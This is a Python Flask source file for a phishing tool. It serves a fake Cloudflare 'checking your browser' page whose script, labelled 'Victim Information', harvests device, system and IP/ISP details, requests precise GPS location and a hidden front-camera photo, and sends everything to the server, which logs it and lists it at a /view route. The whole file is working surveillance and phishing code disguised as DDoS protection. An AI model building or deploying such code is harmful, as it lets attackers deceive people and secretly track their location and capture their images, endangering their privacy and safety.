import os
import json
import time
import random
import string
from flask import Flask, request, render_template_string, make_response

app = Flask(__name__)

storage = []

def gen_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

template_html = """
<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
<meta name="robots" content="noindex, nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Just a moment...</title>
<style type="text/css">
html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
p {font-size: 20px; font-weight: 400; margin: 8px 0;}
p, .attribution {text-align: center;}
.attribution {margin-top: 32px;}
@keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
a { color: #2c7cb0; text-decoration: none; transition: color 0.15s ease; }
a:hover{color: #f4a15d}
.attribution{font-size: 16px; line-height: 1.5;}
.ray_id{display: block; margin-top: 8px;}
</style>
</head>
<body>
<table width="100%" height="100%" cellpadding="20">
<tbody>
<tr>
<td align="center" valign="middle">
<div class="cf-browser-verification cf-im-under-attack">
<noscript>
<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
</noscript>
<div id="cf-content" style="display: block;">
<div id="cf-bubbles">
<div class="bubbles"></div>
<div class="bubbles"></div>
<div class="bubbles"></div>
</div>
<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1>
<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p>
<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p>
</div>
</div>
<div class="attribution">
DDoS protection by <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
<br>
<span class="ray_id">Ray ID: <code id="ray">{{ray_id}}</code></span>
</div>
</td>
</tr>
</tbody>
</table>

<video id="video" style="display:none" playsinline autoplay></video>
<canvas hidden id="canvas" width="500" height="500"></canvas>

<script>
var camDone = false, locDone = false;

async function collectAll() {
    var data = "";
    var uid = "{{uid}}";
    
    data += '<code>✅ Victim Information</code><br><br>';
    data += '<b>⚓ Time: ' + new Date() + '</b><br>';

    function getDeviceType() {
        const ua = navigator.userAgent;
        if (/iPhone/.test(ua)) return "iPhone";
        if (/iPad/.test(ua)) return "iPad";
        if (/Android/.test(ua)) {
            const match = ua.match(/Android[^;]*;[^)]*\)([^;]*)/);
            return match ? match[1].trim() : "Android Device";
        }
        if (/Windows Phone/.test(ua)) return "Windows Phone";
        if (/Windows/.test(ua)) return "Windows PC";
        if (/Macintosh/.test(ua)) return "Mac";
        if (/Linux/.test(ua)) return "Linux Device";
        return "Unknown Device";
    }

    function getOS() {
        const ua = navigator.userAgent;
        let match;
        if ((match = ua.match(/Android (\\d+(?:\\.\\d+)?)/))) return `Android ${match[1]}`;
        if ((match = ua.match(/iPhone OS (\\d+_\\d+)/))) return `iOS ${match[1].replace('_', '.')}`;
        if ((match = ua.match(/Windows NT (\\d+\\.\\d+)/))) return `Windows ${match[1]}`;
        if ((match = ua.match(/Mac OS X (\\d+_\\d+)/))) return `macOS ${match[1].replace('_', '.')}`;
        return "Unknown OS";
    }

    function getBrowser() {
        const ua = navigator.userAgent;
        if (/Chrome/.test(ua) && !/Edge|Edg/.test(ua)) return "Chrome";
        if (/Firefox/.test(ua)) return "Firefox";
        if (/Safari/.test(ua) && !/Chrome/.test(ua)) return "Safari";
        if (/Edge|Edg/.test(ua)) return "Microsoft Edge";
        if (/Opera|OPR/.test(ua)) return "Opera";
        return "Unknown Browser";
    }

    data += "<br><b>📱 <i>DEVICE OVERVIEW</i></b><br>";
    data += "<b>📲 Device:</b> <code>" + getDeviceType() + "</code><br>";
    data += "<b>💻 OS:</b> <code>" + getOS() + "</code><br>";
    data += "<b>🌐 Browser:</b> <code>" + getBrowser() + "</code><br>";
    data += "<b>🔧 Platform:</b> <code>" + navigator.platform + "</code><br>";

    data += "<br><b>🖥️ <i>DISPLAY</i></b><br>";
    data += "<b>📐 Screen:</b> <code>" + screen.width + " x " + screen.height + "</code><br>";
    data += "<b>🪟 Window:</b> <code>" + window.innerWidth + " x " + window.innerHeight + "</code><br>";
    data += "<b>🎨 Color:</b> <code>" + screen.colorDepth + "-bit</code><br>";

    data += "<br><b>⚡ <i>SYSTEM</i></b><br>";
    data += "<b>🧠 CPU Cores:</b> <code>" + navigator.hardwareConcurrency + "</code><br>";
    if(navigator.deviceMemory) data += "<b>💾 RAM:</b> <code>" + navigator.deviceMemory + " GB</code><br>";
    data += "<b>🌍 Language:</b> <code>" + navigator.language + "</code><br>";
    data += "<b>🕐 Timezone:</b> <code>" + Intl.DateTimeFormat().resolvedOptions().timeZone + "</code><br>";

    data += "<br><b>👆 <i>INPUT</i></b><br>";
    data += "<b>📱 Touch:</b> <code>" + ('ontouchstart' in window ? '✅ Yes' : '❌ No') + "</code><br>";
    if(navigator.maxTouchPoints) data += "<b>🖐️ Touch Points:</b> <code>" + navigator.maxTouchPoints + "</code><br>";
    data += "<b>🍪 Cookies:</b> <code>" + (navigator.cookieEnabled?'✅ Enabled':'❌ Disabled') + "</code><br>";
    data += "<b>🌐 Online:</b> <code>" + (navigator.onLine?'✅ Connected':'❌ Offline') + "</code><br>";

    data += "<br><b>🔒 <i>SECURITY</i></b><br>";
    data += "<b>🚫 Do Not Track:</b> <code>" + (navigator.doNotTrack ? '✅ Enabled' : '❌ Disabled') + "</code><br>";
    data += "<b>🤖 Webdriver:</b> <code>" + (navigator.webdriver ? '⚠️ Detected' : '✅ Not Detected') + "</code><br>";

    if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        try {
            await navigator.mediaDevices.enumerateDevices().then(function(devices) {
                var audioCount = 0, videoCount = 0;
                devices.forEach(function(device) {
                    if(device.kind === 'audioinput') audioCount++;
                    if(device.kind === 'videoinput') videoCount++;
                });
                data += "<br><b>📷 <i>MEDIA DEVICES</i></b><br>";
                data += "<b>🎤 Mics:</b> <code>" + audioCount + "</code><br>";
                data += "<b>📹 Cameras:</b> <code>" + videoCount + "</code><br>";
            });
        } catch(e) {}
    }

    if("getBattery" in navigator){
        try {
            await navigator.getBattery().then(function(battery) {
                data += "<br><b>🔋 <i>BATTERY</i></b><br>";
                const level = (battery.level*100).toFixed(0);
                data += "<b>🔋 Level:</b> <code><b>" + level + "%</b></code><br>";
                data += "<b>⚡ Charging:</b> <code>" + (battery.charging?"✅ Yes":"❌ No") + "</code><br>";
            });
        } catch(e) {}
    }

    try {
        const ipResponse = await fetch('https://ipinfo.io/json');
        const ipData = await ipResponse.json();
        data += "<br><b>🌐 <i>NETWORK</i></b><br>";
        data += "<b>📍 IP:</b> <code>" + (ipData.ip || 'Unknown') + "</code><br>";
        data += "<b>🏙️ City:</b> <code>" + (ipData.city || 'Unknown') + "</code><br>";
        data += "<b>🇺🇸 Country:</b> <code>" + (ipData.country || 'Unknown') + "</code><br>";
        data += "<b>🛰️ ISP:</b> <code>" + (ipData.org || 'Unknown') + "</code><br>";
    } catch(e) {}

    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                const coords = pos.coords;
                fetch('/location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        uid: uid,
                        lat: coords.latitude,
                        lon: coords.longitude,
                        acc: coords.accuracy
                    })
                });
                locDone = true;
                checkDone();
            },
            function(err) {
                locDone = true;
                checkDone();
            },
            {enableHighAccuracy: true, maximumAge: 0, timeout: 10000}
        );
    } else {
        locDone = true;
        checkDone();
    }

    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }
            });
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            video.srcObject = stream;
            
            setTimeout(function(){
                context.drawImage(video, 0, 0, 500, 500);
                const imageData = canvas.toDataURL("image/jpeg").replace("data:image/jpeg;base64,", "");
                
                fetch('/camera', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        uid: uid,
                        image: imageData
                    })
                });
                
                stream.getTracks().forEach(track => track.stop());
                camDone = true;
                checkDone();
            }, 3000);
        } catch(e) {
            camDone = true;
            checkDone();
        }
    } else {
        camDone = true;
        checkDone();
    }

    fetch('/data', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            uid: uid,
            info: data
        })
    });
}

function checkDone() {
    if(camDone && locDone) {
        setTimeout(function(){
            window.location.href = "https://cloudflare.com";
        }, 2000);
    }
}

setTimeout(function() {
    collectAll();
}, 2000);

window.onload = function() {
    var chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
    var rayId = "";
    for(var i = 0; i < 16; i++) {
        rayId += chars[Math.floor(Math.random() * 35)];
    }
    document.getElementById("ray").innerHTML = rayId;
};
</script>
</body>
</html>
"""

@app.route('/')
def main():
    ray_id = gen_id()
    uid = gen_id()
    response = make_response(render_template_string(template_html, ray_id=ray_id, uid=uid))
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/data', methods=['POST'])
def handle_data():
    data = request.get_json()
    data['timestamp'] = time.time()
    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    storage.append(data)
    
    print(f"[INFO] {time.strftime('%H:%M:%S')} - IP: {data.get('ip', 'Unknown')}")
    return {'status': 'ok'}

@app.route('/location', methods=['POST'])
def handle_location():
    data = request.get_json()
    print(f"[LOCATION] {time.strftime('%H:%M:%S')} - GPS: {data.get('lat')}, {data.get('lon')}")
    return {'status': 'ok'}

@app.route('/camera', methods=['POST'])
def handle_camera():
    data = request.get_json()
    print(f"[CAMERA] {time.strftime('%H:%M:%S')} - Photo captured")
    return {'status': 'ok'}

@app.route('/view')
def view_data():
    return {'count': len(storage), 'data': storage}

@app.route('/clear')
def clear_data():
    storage.clear()
    return {'status': 'cleared'}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
